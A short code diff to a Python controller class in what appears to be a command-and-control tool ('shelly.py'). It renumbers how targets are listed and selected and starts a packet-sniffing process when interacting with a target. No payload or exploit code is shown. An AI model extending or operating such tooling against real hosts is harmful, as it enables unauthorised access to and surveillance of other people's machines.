@@ -37,8 +37,8 @@ class Controller(Host):
 
         response += "  ID  IP\t      Status\t Location\n"
         response += "  --  --------------  ---------  -----------------\n"
-        for i,target in enumerate(targets):
-            response += f"  {i}   {target['ip']}  {target['status']}  {target['location']}\n"
+        for target in targets:
+            response += f"  {target['number']}   {target['ip']}  {target['status']}  {target['location']}\n"
         
         response += "\n[ Available Modules ]\n\n"
         response += "  Name\t\tDescription\n"
@@ -64,7 +64,7 @@ class Controller(Host):
 
     def interact(self, target):
         Target = Query()
-        target = self.db.search(Target.id == target)[0]
+        target = self.db.search(Target.number == target)[0]
 
         sniffer = Process(target=self.sniffing, args=(target['ip'],))
         sniffer.start()
@@ -122,10 +122,7 @@ def main():
         case "interact":
             if args.target == "all":
                 parser.error(f"The command {args.command} can only take one target")
-            targets = controller.db.all()
-            targets = sorted(targets, key=lambda d: d['id'])
-            print(targets)
-            #controller.interact(targets[int(args.target)]['ip'])
+            controller.interact(int(args.target))
         case "run":
             if (args.module is None):
                 parser.error(f"The command {args.command} requires you to declare a module\nModules can be found by running shelly.py ls")
